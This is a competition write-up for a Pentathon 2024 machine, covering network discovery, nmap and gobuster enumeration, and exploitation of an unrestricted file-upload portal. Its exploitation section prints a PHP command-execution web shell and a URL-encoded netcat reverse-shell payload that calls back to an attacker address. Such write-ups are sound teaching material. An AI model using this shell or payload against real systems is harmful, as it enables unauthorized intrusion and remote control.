# Pentathon 2024
https://github.com/user-attachments/assets/cc4ce1f9-e3b9-4c1c-bd59-ed164deda038
# Approach
# Initial Discovery 1.Discover Ip
        First Task is to Discover the ip because the machine does not disclose the Ip address 
        so i used Netdiscover Tool
        
        # Command
        ----------------
        sudo netdiscover
        -----------------
# Service And Network Info 2. Scan the Ip Address with Network Scanners[Nmap]:

        # Command:
        -------------------------------------------------------------------------------------------------
        nmap -sV -sC -vv -A -oN namp.txt 192.168.1.39
        -sV - Version Detection
        -sC - Default Scripts
        -oN - Output File Spec
        -vv  - Verbose
        -A - Aggressive Scan and For os Detection
        Finally:
                Ip Address
        ----------------------------------------------------------------------------------------------------
        # Nmap Results:
        ----------------------------------------------------------------------------------------------------
        # Nmap 7.94 scan initiated Sun Mar 17 07:11:42 2024 as: nmap -sV -sC -vv -A -oN namp.txt 192.168.1.39
        Nmap scan report for 192.168.1.39
        Host is up, received syn-ack (0.0029s latency).
        Scanned at 2024-03-17 07:11:42 EDT for 8s
        Not shown: 998 closed tcp ports (conn-refused)
        PORT   STATE SERVICE REASON  VERSION
        22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
        | ssh-hostkey: 
        |   3072 ec:ac:6a:d6:a2:67:11:df:d0:86:d5:43:3b:3a:6f:ae (RSA)
        | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDf19J56gdEhI+URf3tumX/Djo5uq7ZpBe1dv2IS5SJlbNX/8+GTKyo8D/aW96VbWEzmiVM4LBGXnDxQGWYXuE4aohYySOfCXZ29/GgMCF/yQp7xbLnxi9DZkbl9z93EoK0iwVbB+CkFA2Ze/JpNoBv+JhnFf+oy8um/HEW45EkpmQfJ2Lakvky0qzve4cxGqB/RuggXXfGebL6cGOO7YjV4i5tkmbfT7hRuyTi0thDTDUU4BBnVuOrWBHKmZ5DxBeFEdMfG95ip/erOF1/lpWWjsldWTPkbKSEkNVfRa0uMcU0aMcIDbp+Ybs6Zc5XMQgRAMRYGmZbKe9MTQzlN3FqJ09kIH60LH4qdQxMsvTZ+Kn8UnzjzsmQUkvGsdYjqSHv8fO7WjBGhG9vWRcQI9cTKt/i2FfhKo/6jUXUSfdEw+vfnaG6Q+GnAstovScAhxWuM+KFCqEYSd6vqEIRgYSZJvlwwffCA3wDcNVUfOBlb0mick98E4uu0HYyarsZ56M=
        |   256 50:2c:a5:ac:31:63:a2:38:d8:ba:a0:cd:de:2b:09:7f (ECDSA)
        | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMrUolI1bkjU9bnIIbYP7Y9dHVIkGJyJuVi18UcIT9dlhlno5SJKDXl7lq3L+S5WREKVYHWowg6AjVhHsCMUjls=
        |   256 33:66:a3:79:8e:6e:3c:4d:ba:0e:e5:52:da:3a:4e:1e (ED25519)
        |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILKC7Imv+iaPKfWhQbUUYoxlcYPCFftQsgBo3WqySpx7
        80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
        |_http-title: Image Analyzer - Complaints
        |_http-server-header: Apache/2.4.57 (Debian)
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
        
        Read data files from: /usr/bin/../share/nmap
        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        # Nmap done at Sun Mar 17 07:11:50 2024 -- 1 IP address (1 host up) scanned in 8.41 seconds
![Screenshot 2024-07-20 152527](https://github.com/user-attachments/assets/7aec4d55-ea2b-4c0c-b215-8bff1e00227c)

# Based on the Scan Results
        The Port 80 was open and a web server was running as Apache so i just viewed it in my browser so i 
        got some idea about the website but i does'nt had any idea about the web technologies Running such as 
        What Language is used in backend what is the version such info so i tried to use WHATWEB tool
        And also ssh port was open as per the pentathon rules brute force was not allowed so i dont need to
        bruteForce the username and password of ssh

# WhatWeb usage:
        
![Screenshot 2024-07-20 142924](https://github.com/user-attachments/assets/d1b0f34a-c012-4b15-883b-69c3942a0435)

# Port 80 Vulnerablity Analysis:
        First And Formost i Ran Nikto Tool for vulnerablity Analysis and was Getting Nothing
        so i Started a directory Discovery using gobuster
        ===============================================================
        Gobuster v3.6
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        [+] Url:                     http://192.168.1.39
        [+] Method:                  GET
        [+] Threads:                 10
        [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
        [+] Negative Status codes:   404
        [+] User Agent:              gobuster/3.6
        [+] Timeout:                 10s
        ===============================================================
        Starting gobuster in directory enumeration mode
        ===============================================================
        
        [2K/resources            (Status: 301) [Size: 316] [--> http://192.168.1.39/resources/]
       
        [2K/uploads              (Status: 301) [Size: 314] [--> http://192.168.1.39/uploads/]
        
        [2K/actual               (Status: 301) [Size: 313] [--> http://192.168.1.39/actual/]
        
        [2K/server-status        (Status: 403) [Size: 277]
        
        ===============================================================
        Finished
        ===============================================================

 ![Screenshot 2024-07-20 153755](https://github.com/user-attachments/assets/296a3662-e68f-4edd-bd86-2c2c08f2e08d)
 # Based on the Results:
         So i Got a Idea that there is upload portal so it could be possibly a file upload based attack so
         started to traverse the directory and i got a upload portal where i would upload not only image
         but i can upload other files like .html,.php so as per the whatweb results the backend was Running
         php so i uploaded a php file and i got everything listed in images/ directory
![Screenshot at 2024-03-17 07-59-32](https://github.com/user-attachments/assets/15113a9d-a96b-4064-b7c8-34a3d37bc7f0)
# Exploitation:

        Uploading of a simple php command execution shell

        # Code [Shell.php]:
        
        <?php echo "Shell";system($_GET['cmd']); ?>
        
        # Listener:
         nc -lnvp <port>
         -l - Listening For incoming Connection
         -n - Numberic Ip
         -v - Verbose
         -p - Port
         
        # Reverse Shell :
        url Encoded Payload : nc%20-c%20sh%2010.10.10.10%209001

        #Finally:

https://github.com/user-attachments/assets/142bdb49-ddbb-4d44-836c-6c983c3b104d


